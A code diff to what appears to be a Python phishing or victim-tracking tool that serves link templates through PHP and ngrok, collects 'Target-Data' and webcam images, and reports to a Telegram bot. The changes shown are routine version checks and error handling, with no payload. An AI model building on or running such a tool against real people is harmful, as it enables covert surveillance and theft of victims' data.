@@ -4,7 +4,7 @@ from os import getcwd, listdir, name, stat, system
 from pathlib import Path
 from platform import uname
 from subprocess import Popen
-from sys import exit, version
+from sys import exit, version_info
 from time import sleep
 
 from colorama import Fore, init
@@ -23,7 +23,11 @@ from Modules.notifier import TelegramBot
 from Modules.timeOptions import TimeOptions
 
 if name == "nt":
-    from win10toast import ToastNotifier
+    try:
+        from win10toast import ToastNotifier
+    except ModuleNotFoundError:
+        print("\n[!] Please install (win10toast) module with\npip install win10toast==0.9")
+        exit()
 
 LG = Fore.LIGHTGREEN_EX  # light green
 LR = Fore.LIGHTRED_EX  # light red
@@ -50,13 +54,14 @@ def banner():
 
 
 def check_py_version():
-    py_version = version.split(" ")[0].replace(".", "").replace("+", "")
-    if int(py_version) < 380:
-        print("\n\n" + LR +
-              " [!] This script requires at least Python version 3.8 to run!")
-        exit()
+    py_version = version_info
+    if py_version[0] >= 3:
+        if py_version[1] < 8:
+            print(LR + "[!] This script requires at least python3.8 to work fine!")
+            exit()
     else:
-        pass
+        print(LR + "[!] This script only works for Python3 or later!")
+        exit()
 
 
 def win10_notify(
@@ -228,7 +233,7 @@ def start():
             elif opt == "05":
                 MainServer(temps.loadPath("3")).create_data_link()
             elif opt == "06":
-                print("\n" + LC + " [>] TXT Files: \n" + LY)
+                print("\n" + LC + " [>] Data Files: \n" + LY)
                 list_files("./Target-Data")
                 print("\n" + LC + " [>] Webcam IMG Files: \n" + LY)
                 list_files("./Webcam-Images")
@@ -315,8 +320,6 @@ def check_updates():
                     t_print.out(
                         LR + f" [>] Something went wrong while updating!")
                 press_enter()
-            else:
-                pass
     except KeyboardInterrupt:
         exit()
 
@@ -418,7 +421,7 @@ class MainServer:
         if name == "nt":
             with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w", encoding="UTF-8") as kill_process:
                 Popen(("taskkill", "/F", "/IM", "php*"),
-                      stdout=kill_process, stderr=kill_process)
+                       stdout=kill_process, stderr=kill_process)
         else:
             with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w", encoding="UTF-8") as kill_process:
                 Popen(("pkill", "php"), stdout=kill_process, stderr=kill_process)
@@ -561,7 +564,9 @@ class MainServer:
                 print("\n\n" + LR + " [#getUserData] ERROR : " + str(error))
                 self.kill_php_ngrok()
             except KeyboardInterrupt:
-                exit()
+                self.tele_bot.sendMessage(f"❌ Link expired! (Closed server)\n\n🌐 Template name : {template_name}" +
+                                          f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
+                self.kill_php_ngrok()
 
 
 def implement_userdata(info_data: dict, ip: dict):
